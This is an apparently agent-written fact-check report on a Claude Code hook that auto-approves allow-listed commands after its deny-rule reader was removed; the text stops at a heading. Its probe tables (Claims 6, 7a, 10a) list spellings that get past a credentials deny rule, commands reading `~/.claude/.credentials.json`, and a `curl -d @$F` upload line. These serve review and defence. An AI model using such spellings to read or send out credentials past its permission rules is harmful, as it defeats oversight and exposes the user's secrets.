Commit: 73698a91

# Code Fact-Check Report

**Repository:** /workspace/.claude/wt-q092 (branch fix/q092-drop-hook-deny-reader)
**Scope:** Full Q-092 unit 2 against its base, unit 1 (fix/q092a-drop-deny-option at 5ba83a3a): `git diff fix/q092a-drop-deny-option 73698a91 -- ':(exclude)docs/reviews'` (6 files: docs/decisions/log.md, guides/bare-host-hook-wiring.md, hooks/auto-approve-allowed-commands.sh, hooks/wiring.json, test/auto-approve-allowed-commands.bats, test/link-claude-home-wiring.bats), plus the messages from `git log fix/q092a-drop-deny-option..73698a91 --no-merges` (ed06dec1, fdae7834, 0444b1ac). The size figure in merge commit 72b8c825 is also checked. Unit 1 and the earlier q092b reports are context only. Final confirming pass, not a loop pass.
**Checked:** 2026-10-15
**Replication:** k=3
**Commit:** 73698a91
**Total claims checked:** 35 (30 numbered; Claims 1, 3, 7, 9, 10 and 26 are each split into a/b)
**Summary:** 28 verified, 3 mostly accurate, 0 stale, 0 incorrect, 4 unverifiable

Execution provenance. Every executed claim ran with cwd `/workspace/.claude/wt-q092` on jq-1.6, GNU bash 5.2.15 and shfmt v3.13.1, at 2026-10-15T12:25Z–12:31Z. Captured output is in `$A` = `/home/node/.claude/jobs/00bcf178/tmp/q092/agents/code-fact-check-report-q092b-final-r3/`. Each probe script there writes its own `.log`, and each built its fixtures in a mktemp directory under `$A` and deleted it afterwards. Each probe runs the real hook with a fake `$HOME` and a fake git project. The pre-stack hook (`00a27a2f`) and the unit-1-tip hook (`5ba83a3a`) were taken with `git show` into `$A/hook-pre-00a27a2f.sh` and `$A/hook-base-5ba83a3a.sh`. No background processes were left running (checked with `ps` after the last probe). The hallucination pattern log (`docs/reviews/hallucination-patterns.md`) was read. No claim matches a logged pattern.

| Run | Command | Exit | Log |
|---|---|---|---|
| R1 | `timeout 600 bats test/auto-approve-allowed-commands.bats` | 0 (35/35 ok) | `$A/bats-hook.log` |
| R2 | `timeout 600 bats test/link-claude-home-wiring.bats` | 0 (16/16 ok) | `$A/bats-link.log` |
| P1 | `timeout 120 bash $A/probe1.sh $A` (exit paths) | 0 | `$A/probe1.log` |
| P2 | `timeout 300 bash $A/probe2.sh $A` (SETTINGS_RULES_JQ shape matrix) | 0 | `$A/probe2.log` |
| P3 | `timeout 300 bash $A/probe3.sh $A` (deny spellings: 00a27a2f / 5ba83a3a / HEAD) | 0 | `$A/probe3.log` |
| P4 | `timeout 300 bash $A/probe4.sh $A` (RULE SYNTAX via --permissions) | 0 | `$A/probe4.log` |
| P5 | `timeout 300 bash $A/probe5.sh $A` (test vs explode timing; deny:[1] pre-stack) | 0 | `$A/probe5.log` |
| P6 | `timeout 120 bash $A/probe6.sh $A` (NaN file with a deny rule, three hooks) | 0 | `$A/probe6.log` |
| P7 | `timeout 120 bash $A/probe7.sh $A` (unreadable / directory / dangling symlink) | 0 | `$A/probe7.log` |
| M | `timeout 600 python3 -I $A/mutants.py $A` (12 mutants on a copy, plus a control) | 0 | `$A/mutants.log` |

---

## Claim 1a: Decision log row 53, 2026-10-15 amendment (every sentence except the "now also" clause)

**Location:** `docs/decisions/log.md:76`
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers what the amendment says the hook does: the removals, allow-or-nothing output, its stdout test, one interpreter for deny rules, non-string entries skipped, hook-side residuals, the Q-082 version note and the `@latest` install, the header section names, and the plan path. Does not cover Claude Code's side of these sentences (Claims 7b, 9b, 10b) or the "now also" clause (Claim 1b).

The amendment checked sentence by sentence:
- "the deny reader, `--deny` and the de-quoted matching are removed". `DENY_GLOBS`, `add_deny_rule` and `matches_deny` are gone from HEAD (paraphrased — no quote available because the claim is about absence: `rg` returns no hits outside docs/reviews). `--deny` falls into main's catch-all `*) shift ;;` (`hooks/auto-approve-allowed-commands.sh:290-292`). R1 test 'the hook ignores a --deny argument' passes.
- "The hook emits only `allow` or nothing (never `ask` … ; a test pins its stdout)". See Claims 3a and 20.
- "each deny rule now has one interpreter, Claude Code's". P3 shows HEAD approves every listed deny-matching command (`$A/probe3.log`).
- "non-string entries are skipped". P2: `allow:[5,null,{},["Bash(cat:*)"],"Bash(cat:*)"]` loads 2 prefixes (1 from the global file, 1 from the project file).
- "New residual … the hook still approves from its allow rules". P6: a file holding NaN plus a deny rule is approved at HEAD (`$A/probe6.log`).
- "Q-082 did not record its Claude Code version and the image installs `@latest`". `devcontainer-config/Dockerfile:19` reads `ARG CLAUDE_CODE_VERSION=latest`. The `### Q-082` archive entry records no version (paraphrased — no quote available because this is an absence in a long entry: `docs/working/questions-archive.md`, Q-082 section, read in full).
- "the hook header's ROLE gives the re-test trigger, and its DENY RULES ARE CLAUDE CODE'S and FAILS CLOSED sections replace WHAT THE DENY CHECK GUARANTEES". The header has `# ROLE: AN ALLOW-ONLY CONVENIENCE LAYER (Q-092).` with the trigger `re-run Q-082's test when a Claude Code release changes …` (`hooks/auto-approve-allowed-commands.sh:50-59`), `# DENY RULES ARE CLAUDE CODE'S (Q-092).` (`:63`) and `# FAILS CLOSED on its inputs:` (`:74`).
- "Plan and bypass-family table: `docs/working/plan-q092-drop-hook-deny-reader.md`". The file exists, and line 27 reads `## Pre-mortem: bypass families`.

**Evidence:** `docs/decisions/log.md:76`, `hooks/auto-approve-allowed-commands.sh:50-85`, `devcontainer-config/Dockerfile:19`, `$A/probe2.log`, `$A/probe3.log`, `$A/probe6.log`, `$A/bats-hook.log`

---

## Claim 1b: "The hook still fails closed on an unreadable or ill-shaped settings file, now also when `permissions` is present but not an object, or `permissions.allow`, `.deny` or `.ask` is present but not an array or holds a string with a NUL"

**Location:** `docs/decisions/log.md:76`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers which of the listed cases are new compared with unit 1's tip (5ba83a3a) and with the pre-stack hook. Does not cover Claude Code's handling of the same files.

The list of cases that fail closed is correct at HEAD. P2 shows 0 prefixes for every listed shape (`$A/probe2.log`). "now also" overstates what is new. The base already rejected a non-object `permissions` other than null, and already rejected a non-array `allow` or `deny`. It also rejected a NUL in any emitted allow or deny string. The base jq (removed lines in the diff) reads:

```
| .permissions
| if . == null then empty
  elif type != "object" then error("permissions is not an object")
...
((.allow // []) | if type == "array" then ... else error("permissions.allow is not an array") end),
((.deny // []) | if type == "array" ... else error("permissions.deny is not an array") end)
...
| if explode | any(. == 0) then error("NUL inside a rule string") else . end
```

The new cases are `permissions: null`, `allow`/`deny` set to null or false, and anything wrong under `ask`. Precise version: "now also when `permissions` is null, `allow` or `deny` is null or false, or `ask` is not an array or holds a NUL". This is wording only. Behavior at HEAD matches the list.

**Evidence:** `docs/decisions/log.md:76`, removed jq in `git diff fix/q092a-drop-deny-option 73698a91 -- hooks/auto-approve-allowed-commands.sh` (old SETTINGS_RULES_JQ), `$A/probe2.log`

---

## Claim 2: Bare-host guide paragraph: "It emits only `allow` or nothing, and it does not read deny rules: Claude Code applies `permissions.deny` even after a hook `allow` (host test Q-082), so the credentials backstop is the `Bash(*.credentials.json*)` deny rule alone where no sandbox runs …"

**Location:** `guides/bare-host-hook-wiring.md:156-161`
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's output and that it does not read deny rules, the Q-082 citation, and the header section names. Does not cover the clause "a glob such as `~/.claude/.c*` gets past it", which describes Claude Code's matcher (Claim 7b).

P1 and the stdout test show only the allow JSON or empty stdout (Claim 3a). P3 shows HEAD approving `cat ~/.claude/.credentials.json` while the global settings carry `Bash(*.credentials.json*)` (`$A/probe3.log`: `cat ~/.claude/.credentials.json … head=allow`). The Q-082 archive answer reads: "a PreToolUse hook `allow` does **not** override a matching `permissions.deny` rule. The deny won." (`docs/working/questions-archive.md`, `### Q-082`). For Bash, "alone" holds: on the Bash path the only other credentials rule is a `Read()` rule, which does not cover Bash (`hooks/wiring.json:40`: "Read() rules do not cover Bash"). The sections it names exist at `hooks/auto-approve-allowed-commands.sh:63` and `:95`.

**Evidence:** `guides/bare-host-hook-wiring.md:156-161`, `hooks/wiring.json:39-46`, `docs/working/questions-archive.md` (Q-082), `$A/probe3.log`

---

## Claim 3a: "The hook emits one decision, \"allow\", or nothing … It never emits \"ask\", \"deny\" or \"defer\"."

**Location:** `hooks/auto-approve-allowed-commands.sh:50-52`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's stdout on every exit path of `main` (signature to `exit 0` at `:278-374`) and on the functions it calls. Does not cover other hooks: `guard-trusted-writes.py` can still emit `ask` (rubric C8, out of scope).

All of `main` was read (`:278-374`). Exactly one statement writes to stdout: `echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}'` (`:368`). Every other branch ends in `exit 0` or `return` with output only through `debug` to stderr. `extract_commands_raw` writes its parse error to stderr (`:667`: `echo "Parse error: $ast" >&2`). P1 covered approved, unlisted, non-JSON, non-string command, array command, non-object `tool_input`, empty stdin, jq missing from PATH and shfmt missing from PATH. Stdout was always the allow JSON or empty (`$A/probe1.log`). Mutants M1–M3 make the refused or parse-failure path print an `ask` decision, two of them built at runtime so that the test's static grep cannot see the string. The stdout test killed all three (`$A/mutants.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:278-374`, `:665-668`, `$A/probe1.log`, `$A/mutants.log`

---

## Claim 3b: "(exit 0 with no output, so Claude Code's own rules and prompt decide)"

**Location:** `hooks/auto-approve-allowed-commands.sh:51`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's exit status on the "nothing" paths. Does not establish how Claude Code treats exit 4 or 5 (only Claude Code's hook contract could say). Exit 2 is the blocking status, and no path produced it.

On malformed hook input the hook exits non-zero, not 0, still with empty stdout. P1 recorded `exit=4 stdout=[] input=not\ json` and `exit=5 stdout=[]` for `{"tool_input":"ls"}` and for `[]` (`$A/probe1.log`). The cause is `set -euo pipefail` (`:106`) together with `command=$(echo "$input" | jq -r '.tool_input.command // empty')` (`:305`). Claude Code always sends a JSON object, so on real input every "nothing" path is exit 0, and no path exits 2. Precise version: "no output (exit 0, or a non-2 jq error status on malformed input)". This changes nothing for Q-092's premise. The earlier stdout test already notes this path ("malformed input", `test/auto-approve-allowed-commands.bats:150-151`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:106`, `:303-313`, `$A/probe1.log`

---

## Claim 4: "a hook \"ask\" overrides permissions.deny (Claude Code issue #39344)"

**Location:** `hooks/auto-approve-allowed-commands.sh:53-54` (also `test/auto-approve-allowed-commands.bats:116`, `docs/decisions/log.md:76`)
**Type:** Reference
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers only that the repo cites this issue consistently: here, in the linker comment (`devcontainer-config/link-claude-home.sh:128-129`) and in wiring.json. Does not establish what issue #39344 says or Claude Code's actual precedence for `ask`.

The sandbox has no egress, so the issue cannot be fetched (paraphrased — no quote available because the source is an external GitHub issue). The repo's other citations agree: `# … (a hook "ask" # silently overrides deny — Claude Code issue #39344)` (`devcontainer-config/link-claude-home.sh:128-129`). To verify, read the issue, or run Q-082's always-allow test with `ask` on a host. The hook never emits `ask` (Claim 3a), so its premise does not depend on this claim.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:53-54`, `devcontainer-config/link-claude-home.sh:128-129`, `hooks/wiring.json:33-35`

---

## Claim 5: ROLE: "a hook \"allow\" does not (host test Q-082, 2026-09-28; decision log row 53). Q-082 did not record the Claude Code version (Q-091 saw 2.1.284 on the host that day) and the image installs @latest … cc-isolated has no sandbox (Q-081, Q-125)"

**Location:** `hooks/auto-approve-allowed-commands.sh:54-61`
**Type:** Reference / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers each citation against the archive, the questions file and the Dockerfile. Does not establish that Claude Code releases since 2.1.284 still behave as Q-082 found. The header says so itself and gives a re-test trigger.

Q-082's answer: "**Answer (2026-09-28):** the user confirmed `/hooks` listed the test hook. So a PreToolUse hook `allow` does **not** override a matching `permissions.deny` rule." (`docs/working/questions-archive.md`, `### Q-082`). Q-091's answer: "The user ran `rm ~/claude-workflows/.git/commondir && claude --version` … it printed `2.1.284 (Claude Code)`" (`docs/working/questions-archive.md:1738`), dated 2026-09-28. The next entry also reads "the host runs 2.1.284" (`:1760`). `devcontainer-config/Dockerfile:19` reads `ARG CLAUDE_CODE_VERSION=latest`, and `devcontainer-config/devcontainer.json:29` reads `"CLAUDE_CODE_VERSION": "latest"`. Q-125, "build-cc-isolated-sandbox", is still open in `docs/working/questions.md:50`, so no sandbox has been built yet.

**Evidence:** `docs/working/questions-archive.md` (Q-082, `:1730-1760`), `docs/working/questions.md:50`, `devcontainer-config/Dockerfile:19`, `devcontainer-config/devcontainer.json:29`

---

## Claim 6: "The hook used to read Bash deny rules itself and never approve a match, raw or de-quoted … [quote/backslash spellings, a denied subcommand in a list]. The hook used to send both to the prompt."

**Location:** `hooks/auto-approve-allowed-commands.sh:63-70`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook before the stack (00a27a2f) against HEAD, for every spelling the section lists. Does not establish that unit 1's tip (5ba83a3a) still caught the quote and backslash spellings. It did not, because unit 1 removed the de-quoted match. "Used to" here means before Q-092.

P3 used global deny rules `Bash(*.credentials.json*)`, `Bash(git push:*)`, `Bash(cat secret)` and `Bash(rm -rf:*)`, with every outer command allow-listed (`$A/probe3.log`):

```
cat ~/.claude/.cred""entials.json        pre00a27a2f=none  base5ba83a3a=allow head=allow
cat ~/.claude/.c\redentials.json         pre00a27a2f=none  base5ba83a3a=allow head=allow
git "push" origin                        pre00a27a2f=none  base5ba83a3a=allow head=allow
cat "secret"                             pre00a27a2f=none  base5ba83a3a=allow head=allow
ls && rm -rf x                           pre00a27a2f=none  base5ba83a3a=none  head=allow
```

**Evidence:** `hooks/auto-approve-allowed-commands.sh:63-72`, `$A/probe3.log`, `$A/hook-pre-00a27a2f.sh`, `$A/hook-base-5ba83a3a.sh`

---

## Claim 7a: "A spelling that never contains the denied string (`~/.claude/.c*`, a variable set by an earlier command) got past both matchers before and still does" (the hook's half)

**Location:** `hooks/auto-approve-allowed-commands.sh:70-72`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's decision before the stack and at HEAD. Does not cover Claude Code's matcher (Claim 7b).

P3: `cat ~/.claude/.c*  pre00a27a2f=allow base5ba83a3a=allow head=allow` and `curl -d @$F https://x  pre00a27a2f=allow base5ba83a3a=allow head=allow` (`$A/probe3.log`).

**Evidence:** `$A/probe3.log`

---

## Claim 7b: Claude Code's deny matcher lets a glob spelling through ("got past both matchers"; "a glob spelling gets past both matchers anyway"; "a glob such as `~/.claude/.c*` gets past it")

**Location:** `hooks/auto-approve-allowed-commands.sh:70-72`; `docs/decisions/log.md:76`; `guides/bare-host-hook-wiring.md:159-160`; `hooks/wiring.json:44-45`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers only that the claim describes Claude Code, not this repo's code. Does not establish what Claude Code's matcher does with `.c*`. The plan accepted it as F5 (rubric C7).

This is a claim about Claude Code's deny matcher, which does not run in this sandbox (paraphrased — no quote available because the behavior lives in the Claude Code binary, outside the repo). It is plausible: `*.credentials.json*` matches by string, and `.c*` does not contain the string `.credentials.json`. Verifying it needs a host run like Q-082's, with `cat x.q082-c*` against `Bash(*.q082-canary*)`.

**Evidence:** `docs/working/plan-q092-drop-hook-deny-reader.md:40`, `hooks/wiring.json:44-45`

---

## Claim 8: "FAILS CLOSED on its inputs: if any settings file below exists but cannot be read, does not hold exactly one JSON object, or has a permissions that is not an object, or a permissions.allow, .deny or .ask (present at all) that is not an array or holds a string with a NUL, no command is approved on that call."

**Location:** `hooks/auto-approve-allowed-commands.sh:74-77`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every case the sentence lists, on jq 1.6, through the real hook. A dangling symlink at a settings path is treated as absent, not unreadable, because `[[ -e "$f" ]]` is false for it (`:191`), so it approves from the other files. Does not establish that the case lists match Claude Code's validator.

P2 (`$A/probe2.log`) loaded 0 prefixes, so nothing was approved, for: `permissions` null, [], "x", 5 and false; each of allow/deny/ask set to null, false, "Bash", {}, `["x\u0000y"]` or `[5,"x\u0000y"]`; a good global file followed by a project file with `deny:"x"`; and a good global and project followed by a local file with `ask:{}`. Absent `permissions`, `{}`, `{"model":"x"}`, `[5]`, `[]` and `["x"]` keep the other files' allow rules. P7 (`$A/probe7.log`): a mode-000 global file gives `<none>`, a directory at the path gives `<none>`, and a dangling symlink is approved. Bad JSON, `[]`, `{}{}` and the empty file are covered by R1's wrong-shape loop (`test/auto-approve-allowed-commands.bats:206-218`). The jq (`:158-165`):

```
| if has("permissions") then .permissions else empty end
| if type != "object" then error("permissions is not an object")
  else
    (["allow", "deny", "ask"][] as $k | select(has($k)) | .[$k]
     | if type != "array" then error("permissions.\($k) is not an array")
       elif any(.[]; type == "string" and test("\u0000"))
         then error("NUL inside a permissions.\($k) rule")
       else empty end),
```

(excerpt ends :165; SETTINGS_RULES_JQ continues to :168 — read: `((.allow // [])[] | select(type == "string"))`, `end`, `| . + "\u0000"`.)

**Evidence:** `hooks/auto-approve-allowed-commands.sh:152-200`, `:232-248`, `$A/probe2.log`, `$A/probe7.log`, `$A/bats-hook.log`

---

## Claim 9a: "Non-string entries are skipped, not refused" (hook half)

**Location:** `hooks/auto-approve-allowed-commands.sh:80`; `:148`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers allow, deny and ask on jq 1.6. Does not cover Claude Code's handling (Claim 9b).

`((.allow // [])[] | select(type == "string"))` (`:166`) emits only strings. The shape branch errors only on a non-array value or a NUL inside a string (`:162-164`). P2: `allow:[5]`, `deny:[5]` and `ask:[5]` each keep 1 prefix and approve. A list of only non-strings in the global file adds nothing (`$A/probe2.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:161-166`, `$A/probe2.log`

---

## Claim 9b: "Claude Code drops those with a warning and keeps the file"

**Location:** `hooks/auto-approve-allowed-commands.sh:80-81`; `:148`; `test/auto-approve-allowed-commands.bats:220`; `docs/decisions/log.md:76`; commit 0444b1ac message
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers only that the claim's source is recorded honestly. Does not establish Claude Code's behavior.

The 0444b1ac commit body says: "Claude Code's warning-and-drop behaviour for non-string entries was read from the 2.1.300 binary, not run." No Claude Code binary or validator source is in the repo (paraphrased — no quote available because the behavior is in an external binary). Verifying it needs a host session with a settings file holding `allow:[5,"Bash(ls:*)"]`, checking for the warning and that `ls` is still allowed.

**Evidence:** commit 0444b1ac message; `hooks/auto-approve-allowed-commands.sh:80-81`

---

## Claim 10a: "RESIDUAL: anything Claude Code rejects that this check accepts (… jq-only literals such as NaN) can still make Claude Code drop the file, and its deny rules with it, while its allow rules approve here; the deny reader used to cover that case." (hook half)

**Location:** `hooks/auto-approve-allowed-commands.sh:81-85`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook accepting such a file and the old deny reader blocking the match. Does not cover which values make Claude Code drop a file (Claim 10b).

P6 used a project settings file `{"permissions":{"allow":["Bash(cat:*)"],"deny":["Bash(*.credentials.json*)"]},"x":NaN}` with the command `cat ~/.claude/.credentials.json` (`$A/probe6.log`): `hook-pre-00a27a2f.sh: <none>`, `hook-base-5ba83a3a.sh: <none>`, HEAD `allow`. jq 1.6 accepts `NaN` and `Infinity` as input literals: `{"x":Infinity}` parses to `{"x":1.7976931348623157e+308}` (run inline, output shown in this session).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:81-85`, `$A/probe6.log`, `$A/probe2.log` (last line)

---

## Claim 10b: Claude Code ignores a whole settings file for an invalid value (another key's value, a BOM, NaN)

**Location:** `hooks/auto-approve-allowed-commands.sh:78-83`; `docs/decisions/log.md:76`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers nothing beyond the claim's provenance (the q092b security review read the 2.1.300 binary). Does not establish which values trigger the drop.

This is about Claude Code's validator, outside the repo (paraphrased — no quote available because the behavior is in an external binary). Carried over from pass 2 (rubric C10, accepted). It needs Claude Code's validator traced, or a host run with a settings file holding a bad `defaultMode` next to a deny rule.

**Evidence:** `docs/working/plan-q092-drop-hook-deny-reader.md:41-42`

---

## Claim 11: SETTINGS SOURCES: "resolved like devcontainer-config/link-claude-home.sh's DEST (an empty value falls back; a relative value approves nothing), then <git root>/.claude/settings.json and settings.local.json (the cwd's .claude/ outside a repo). One jq call reads all of them (SETTINGS_RULES_JQ). --permissions replaces all three. Managed settings and --settings files are not read"

**Location:** `hooks/auto-approve-allowed-commands.sh:87-93`
**Type:** Configuration / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers path resolution, the relative-path refusal, the single jq call and the `--permissions` bypass. Does not establish which other settings sources Claude Code itself honors.

`printf '%s\0' "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" "${root:-.}/.claude/settings.json" "${root:-.}/.claude/settings.local.json"` (`:136-137`). The linker has `DEST="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"` (`devcontainer-config/link-claude-home.sh:36`). The relative check is at `:179-182`. The single call is `jq -nj "$SETTINGS_RULES_JQ" "${files[@]}" --args "${files[@]}"` (`:199`). `load_rules` takes the `--permissions` branch and never calls `read_settings_rules` (`:235-246`). R1's CLAUDE_CONFIG_DIR, relative and newline tests pass (`$A/bats-hook.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:133-138`, `:173-200`, `:232-248`, `devcontainer-config/link-claude-home.sh:36`, `$A/bats-hook.log`

---

## Claim 12: RULE SYNTAX table and parse_bash_rule after RULE_LEGACY removal

**Location:** `hooks/auto-approve-allowed-commands.sh:95-104`, `:202-217`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every row of the table and the parser's non-Bash and legacy-suffix handling, on the allow side. Does not establish how Claude Code reads the same rules.

`parse_bash_rule` (`:205-217`, read in full) strips `Bash(`, `)` and then one trailing `:*` (`RULE_BODY=${RULE_BODY%:\*}`, `:215`). It returns 1 unless the rule is `Bash` or matches `Bash(*)`. `RULE_LEGACY` has no remaining reader (paraphrased — no quote available because the claim is about absence: `rg RULE_LEGACY` finds nothing in HEAD). P4 (`$A/probe4.log`):

```
["Bash(ls *)"]  ls *       allow
["Bash(ls *)"]  ls * -la   allow
["Bash(ls *)"]  ls -la     none
["Bash(ls)"]    ls/x       none
["Bash(a/b)"]   a/b/x      allow
["Bash(python3 d)"] python3 d/x allow
["Bash(rm:*)"]  rm x       allow
["Bash(rm:*)"]  rmdir x    none
["Bash"]        ls         none
["Bash(ls"]     ls         none
["Read(ls)"]    ls         none
```

**Evidence:** `hooks/auto-approve-allowed-commands.sh:95-104`, `:202-225`, `:253-276`, `$A/probe4.log`

---

## Claim 13: "The global path is resolved exactly as devcontainer-config/link-claude-home.sh resolves DEST, so the file the linker merges into is the one read here."

**Location:** `hooks/auto-approve-allowed-commands.sh:129-132`
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the expansion expression. Does not cover the hook's extra relative-path refusal, which the linker lacks and which the header states.

The hook uses `"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json"` (`:136`), and the linker uses `DEST="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"` (`devcontainer-config/link-claude-home.sh:36`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:133-138`, `devcontainer-config/link-claude-home.sh:36`

---

## Claim 14: SETTINGS_RULES_JQ comment: "permissions.allow, .deny and .ask, when present (even as null or false), must each be an array, and no string in them may hold a NUL … Only allow is emitted … test(\"\\u0000\"), not contains(): jq 1.6's contains() matches a NUL needle against every string."

**Location:** `hooks/auto-approve-allowed-commands.sh:140-151`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the shape rules, the allow-only output and the jq 1.6 `contains` behavior. Does not establish `contains` behavior on jq 1.7 or later.

P2: `"abc" | contains("\u0000")` → `true`, `"abc" | test("\u0000")` → `false`, `"a\u0000b" | test("\u0000")` → `true`. Calling the program directly on a good file and then a bad one printed only `B a s h ( l s : * ) \0` before the error, so no deny or ask string is ever emitted (`$A/probe2.log`). Mutant M12 (contains in place of test) made the non-string-skipped test fail, because every allow file then errored (`$A/mutants.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:140-169`, `$A/probe2.log`, `$A/mutants.log`

---

## Claim 15: "A relative CLAUDE_CONFIG_DIR resolves against this hook's cwd, not the linker's, so it could name some other directory's settings.json and add its allow rules: fail closed."

**Location:** `hooks/auto-approve-allowed-commands.sh:176-182`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the refusal (return 1 → `load_rules` keeps no rule). Does not cover a relative path that happens to resolve to the right file. It is refused anyway.

`return 1` (`:181`) feeds `if ! wait $!; then … return 0` in `load_rules` (`:242-245`) before any record is added. R1 test 'a relative CLAUDE_CONFIG_DIR fails closed instead of reading another directory's allow rules' passes (`$A/bats-hook.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:173-200`, `:232-248`, `$A/bats-hook.log`

---

## Claim 16: load_rules: "--permissions replaces the settings files (testing), and then they are not read … On failure no rule is kept, not even the records jq printed before its error."

**Location:** `hooks/auto-approve-allowed-commands.sh:227-231`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers both branches of `load_rules` (`:232-248`, read in full) and how `records` flows to `add_allow_rule`. Does not cover bash older than 4.4, which the comment says makes `wait` fail. That was not run.

On failure the function returns at `:244`, before `for rec in "${records[@]}"; do add_allow_rule "$rec"; done` (`:247`), so the records mapfile filled are never used. Calling jq directly on a good file and then a bad one emitted a record and exited 5. Through the hook, "global good, project deny string" gives `Loaded 0 allowed prefixes` (`$A/probe2.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:232-248`, `$A/probe2.log`

---

## Claim 17: "If no prefixes (no Bash permissions, or a settings file could not be read), exit without allowing"

**Location:** `hooks/auto-approve-allowed-commands.sh:318-323`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the branch and both of its causes. Does not cover `--permissions` input that yields no rules. That also reaches this branch, and the comment does not mention it.

`if [[ ${#ALLOW_PREFIXES[@]} -eq 0 ]]; then … exit 0` (`:320-323`). P2's fail-closed cases all print `Loaded 0 allowed prefixes` and no decision (`$A/probe2.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:315-323`, `$A/probe2.log`

---

## Claim 18: wiring.json _comment: "Claude Code applies it even after auto-approve-allowed-commands.sh says allow (host test Q-082), so that hook does not read deny rules (Q-092). It is a string match …"

**Location:** `hooks/wiring.json:42-46`
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook not reading deny rules, the Q-082 citation, that the change is to `_comment` only, and that the linker drops `_` keys. The glob clause is Claim 7b. Q-082 tested a stand-in always-allow hook, not this hook; the general result (a hook `allow` loses to deny) is what applies.

`with_entries(select(.key | startswith("_") | not))` (`devcontainer-config/link-claude-home.sh:135`) drops `_comment` before the merge. The diff touches only `_comment` lines (`git diff … -- hooks/wiring.json`: 5 lines added, 3 removed, all inside the `_comment` array). R2 passes 16/16 (`$A/bats-link.log`). P3 shows the hook approving while the wired rule is present (`$A/probe3.log`).

**Evidence:** `hooks/wiring.json:39-46`, `devcontainer-config/link-claude-home.sh:128-136`, `$A/bats-link.log`, `$A/probe3.log`

---

## Claim 19: Test section comment: "So it no longer reads deny rules: Claude Code applies them after the hook says \"allow\"."

**Location:** `test/auto-approve-allowed-commands.bats:114-117`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's half and the Q-082 citation. Does not establish Claude Code behavior beyond what Q-082 recorded.

See Claims 5 and 21. P3 shows HEAD's decision does not depend on deny rules (`$A/probe3.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:114-120`, `$A/probe3.log`

---

## Claim 20: Stdout test: title "the hook's stdout is empty or exactly the allow decision: never ask, deny or defer"; comment "over main's exit paths for approved, refused, unparseable, unlisted, empty and malformed input (the jq-missing exit is not reached). Statically: the source spells exactly one decision."

**Location:** `test/auto-approve-allowed-commands.bats:147-170`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the match between the comment and the inputs, and that the test catches an `ask` emission on the refused and parse-failure paths, including one built at runtime. Does not cover the jq-missing path, which the comment itself says is not reached. P1 covered that path separately: empty stdout.

The inputs are `'ls -la'` (approved), `'ls $(pwd)'` and `"$REPRO"` (refused), `$'ls ('` (unparseable), `'python3 x'` (unlisted), `''` and `'# comment'` (empty), then a malformed settings file, `{}` and `not json`. The static check is `grep -o '"permissionDecision":"[a-z]*"' "$HOOK" | sort -u`. Mutants M1 (literal `ask`), M2 (`ask` built at runtime on the refused path) and M3 (built at runtime on the parse-failure path) were all killed. The control passed (`$A/mutants.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:147-170`, `$A/mutants.log`, `$A/probe1.log`

---

## Claim 21: "deny rules in the settings files no longer change the hook's decision (Q-092)"; comment "The hook approves; Claude Code's deny rule still denies (Q-082)."

